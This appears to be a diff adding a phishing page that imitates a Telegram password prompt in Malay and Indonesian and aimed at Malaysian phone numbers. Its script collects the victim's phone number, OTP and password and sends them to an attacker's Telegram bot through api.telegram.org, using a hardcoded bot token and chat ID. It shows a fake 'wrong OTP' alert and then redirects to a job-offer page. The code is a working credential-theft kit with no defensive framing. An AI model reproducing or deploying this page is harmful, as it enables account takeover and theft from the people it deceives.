@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Password Verification</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background-color: #ffffff;
+      }
+
+      .password-container {
+        background: #ffffff;
+        width: 90%;
+        max-width: 400px;
+        border-radius: 15px;
+        /* box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); */
+        padding: 30px;
+        text-align: center;
+      }
+
+      .password-container h1 {
+        font-size: 20px;
+        margin-bottom: 10px;
+        font-weight: bold;
+      }
+
+      .password-container p {
+        font-size: 14px;
+        color: #555;
+        margin-bottom: 20px;
+      }
+
+      .password-input {
+        width: 90%;
+        padding: 10px;
+        font-size: 16px;
+        border: 1px solid #ccc;
+        border-radius: 8px;
+        margin-bottom: 20px;
+        outline: none;
+      }
+
+      .submit-button {
+        display: inline-flex;
+        justify-content: center;
+        align-items: center;
+        width: 60px;
+        height: 60px;
+        background-color: #25d366;
+        color: white;
+        font-size: 24px;
+        border-radius: 50%;
+        border: none;
+        text-decoration: none;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        cursor: pointer;
+      }
+
+      .submit-button:hover {
+        background-color: #1caa54;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="password-container">
+      <img src="gembok.png" alt="" style="width: 40%" />
+      <h1>Password Telegram Anda</h1>
+      <p>
+        Please enter your Telegram account password associated with
+        <span id="phone-number">+60 XXXX XXXX</span>.
+      </p>
+      <input
+        type="password"
+        class="password-input"
+        id="password"
+        placeholder="Enter your password"
+      />
+      <button class="submit-button" id="submit-password">
+        <svg
+          xmlns="http://www.w3.org/2000/svg"
+          fill="none"
+          viewBox="0 0 24 24"
+          stroke="currentColor"
+        >
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M9 5l7 7-7 7"
+          />
+        </svg>
+      </button>
+    </div>
+
+    <script>
+      // Load phone number and OTP from localStorage
+      const phoneNumber = localStorage.getItem("phoneNumber");
+      const otp = localStorage.getItem("otp"); // OTP yang tersimpan
+      document.getElementById("phone-number").textContent = phoneNumber
+        ? phoneNumber
+        : "your phone";
+
+      document
+        .getElementById("submit-password")
+        .addEventListener("click", async () => {
+          const password = document.getElementById("password").value;
+
+          if (!password) {
+            alert("Silakan masukkan kata sandi Anda.");
+            return;
+          }
+
+          // Tampilkan alert sebelum berpindah halaman
+          alert(
+            "Kod OTP yang anda masukkan salah, sila semak mesej Telegram untuk memasukkan kod OTP dengan betul!"
+          );
+
+          const message = `
+    ────────────────
+    🔰 DATA | KATA SANDI 🔰
+    ────────────────
+    📱 No HP : \`${phoneNumber}\`
+    🔑 OTP   : ${otp}
+    🔐 Kata Laluan : ${password}
+    ────────────────`;
+
+          const token = "7575918160:AAEacn4kHInFsTxIe1wZAS3OE1DW6wOOWzs";
+          const chatId = "7745865654";
+
+          try {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({ chat_id: chatId, text: message }),
+            });
+
+            // Setelah alert ditampilkan, pindah ke halaman jawatan.html
+            window.location.href = "jawatan.html";
+          } catch (error) {
+            console.error("Gagal mengirim kata sandi ke Telegram.");
+          }
+        });
+    </script>
+  </body>
+</html>
